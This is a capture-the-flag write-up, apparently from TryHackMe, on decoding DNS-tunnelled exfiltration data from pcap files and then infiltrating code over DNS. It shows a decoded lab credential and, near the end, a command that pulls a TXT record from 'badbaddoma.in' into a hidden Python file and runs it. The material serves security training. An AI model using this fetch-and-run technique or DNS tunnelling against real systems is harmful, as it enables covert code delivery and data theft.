## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Github Repos
1. securecorp.txt 
--https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt)
2. packety.py 
--https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py
3. packetGrabber.py 
--https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py
```

## Let's Start 
```Description
Deploy the VM to get started.
Machine IP Address: 10.201.124.182
SSH Credentials:
`Username: user`
`Password: [password omitted]   `  
For this task, you will need to complete the challenges found in `~/challenges/exfiltration` folder.
Tools required in order to complete this task can be found in this folder `~/dns-exfil-infil/`.
Note: to run the python scripts found in `~/dns-exfil-infil/` . Make sure to use `python3`
Example: `python3 file.py`
**Ignore Exception thrown at the end of the script (packetyGrabber.py)**
Read TASK file located in `~/challenges/exfiltration/orderlist/` and `~/challenges/exfiltration/identify/`.
```

## Exfilteration
### Order 
```bash
user@user1:~/challenges/exfiltration/orderlist$ ls
order.pcap  TASK
user@user1:~/challenges/exfiltration/orderlist$ cat TASK 
The order.pcap file has suspecious queries. Use the ~/dns-exfil-infil/packetyGrabber.py to decode
the data and answer the questions accrodingly.

IDENTIFY THE DOMAIN NAME USED TO EXFILTRATE DATA
use the following command to see all DNS Queries
tshark -r order.pcap -T fields -e dns.qry.name
(ignore the .localdomain part)

Use the packetyGrabber.py located in ~/dns-exfil-infil/ folder to decode the DNS queries to a plain-text file.
python3 ~/dns-exfil-infil/packetyGrabber.py

IGNORE THE EXCEPTION THROWN AT THE END OF SCRIPT
user@user1:~/challenges/exfiltration/orderlist$ python3 ~/dns-exfil-infil/packetyGrabber.py
File captured: order.pcap
Filename output: output
Domain Name (Example: badbaddoma.in): 
Domain Name (Example: badbaddoma.in): 
Domain Name (Example: badbaddoma.in): badbaddoma.in
[+] Domain Name set to badbaddoma.in
[+] Filtering for your domain name.
[+] Base58 decoded.
[+] Base64 decoded.
[+] Output to output
Exception ignored in: <bound method BaseEventLoop.__del__ of <_UnixSelectorEventLoop running=False closed=True debug=False>>
Traceback (most recent call last):
  File "/usr/lib/python3.5/asyncio/base_events.py", line 431, in __del__
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 58, in close
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 139, in remove_signal_handler
  File "/usr/lib/python3.5/signal.py", line 47, in signal
TypeError: signal handler must be signal.SIG_IGN, signal.SIG_DFL, or a callable object
user@user1:~/challenges/exfiltration/orderlist$ ls
order.pcap  output  TASK
user@user1:~/challenges/exfiltration/orderlist$ cat output 
DATE    ORDER-ID        TRANSACTION     PRICE      CODE
01-06      1            Network Equip.  $2349.99    -
01-09      2            Software Licen. $1293.49    -
01-11      3            Physical Secur. $7432.79    -
02-06      4            SENT TO #1056.. $15040.23   -
02-06      5            1M THM VOUCHER  $10        zSiSeC
02-06      6            Firewall        $2500       -user@user1:~/challenges/exfiltration/orderlist$ 
```

### Identify
```bash
user@user1:~/challenges/exfiltration/identify$ ls
cap1.pcap  cap2.pcap  cap3.pcap  TASK  TASK1.save
user@user1:~/challenges/exfiltration/identify$ strings cap1.pcap 
Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz (with SSE4.2)
Linux 5.4.0-1029-aws
Dumpcap (Wireshark) 2.6.10 (Git v2.6.10 packaged as 2.6.10-1~ubuntu18.04.0)
eth0
Linux 5.4.0-1029-aws
google
google
google
google
0lq{Y
youtube
youtube
video1
youtube
video1
youtube
google
        dns-admin
video1
youtube
video1
youtube
google
        dns-admin
video2
cloudflare
video2
cloudflare
video2
cloudflare
video2
cloudflare
github
github
/lpM
github
github
dns1
nsone
hostmaster
1lrP
facebook
facebook
facebook
facebook
2ls.
        tryhackme
        tryhackme
        tryhackme
        tryhackme
/lpI
reddit
reddit
reddit
reddit
ns-557  awsdns-05
awsdns-hostmaster
amazon
user@user1:~/challenges/exfiltration/identify$ strings cap2.pcap 
Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz (with SSE4.2)
Linux 5.4.0-1029-aws
Dumpcap (Wireshark) 2.6.10 (Git v2.6.10 packaged as 2.6.10-1~ubuntu18.04.0)
eth0
Linux 5.4.0-1029-aws
googlevideo
googlevideo
google
        dns-admin
googlevideo
googlevideo
google
        dns-admin
user@user1:~/challenges/exfiltration/identify$ strings cap3.pcap 
Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz (with SSE4.2)
Linux 5.4.0-1029-aws
Dumpcap (Wireshark) 2.6.10 (Git v2.6.10 packaged as 2.6.10-1~ubuntu18.04.0)
eth0
Linux 5.4.0-1029-aws
?H\6
Y_Pj
g5SUFQJi3BgPBgh2jYe5Vhm
badbaddoma
g5SUFQJi3BgPBgh2jYe5Vhm
badbaddoma
g5sufqji3bgpbgh2jye5vhm
uuhYFkMJxQsVeFSmCrxtyke
badbaddoma
uuhYFkMJxQsVeFSmCrxtyke
badbaddoma
uuhyfkmjxqsvefsmcrxtyke
pDG6RsCnrcFxCWEGji
badbaddoma
pDG6RsCnrcFxCWEGji
badbaddoma
pdg6rscnrcfxcwegji
\(eb
oO/g
F_G&
Counters provided by dumpcap
user@user1:~/challenges/exfiltration/identify$ 
```

 `Note:` cap3.pcap consider as suspecious file

```bash
user@user1:~/challenges/exfiltration/identify$ python3 ~/dns-exfil-infil/packetyGrabber.py 
File captured: cap3.pcap
Filename output: result
Domain Name (Example: badbaddoma.in): badbaddoma.in
[+] Domain Name set to badbaddoma.in
[+] Filtering for your domain name.
[+] Base58 decoded.
[+] Base64 decoded.
[+] Output to result
Exception ignored in: <bound method BaseEventLoop.__del__ of <_UnixSelectorEventLoop running=False closed=True debug=False>>
Traceback (most recent call last):
  File "/usr/lib/python3.5/asyncio/base_events.py", line 431, in __del__
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 58, in close
  File "/usr/lib/python3.5/asyncio/unix_events.py", line 139, in remove_signal_handler
  File "/usr/lib/python3.5/signal.py", line 47, in signal
TypeError: signal handler must be signal.SIG_IGN, signal.SIG_DFL, or a callable object
user@user1:~/challenges/exfiltration/identify$ ls
cap1.pcap  cap2.pcap  cap3.pcap  output  result  TASK  TASK1.save
user@user1:~/challenges/exfiltration/identify$ cat result 
administrator:s3cre7P@ssword
user@user1:~/challenges/exfiltration/identify$ 
```

Got the Suspicious Login
```Login
administrator:s3cre7P@ssword
```

## Infilterate
```bash
nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py  
python3 ~/dns-exfil-infil/packetySimple.py  
cat .mal.py  
import os;
print(os.uname()[2])
python3 .mal.py
4.4.0-186-generic
```

# End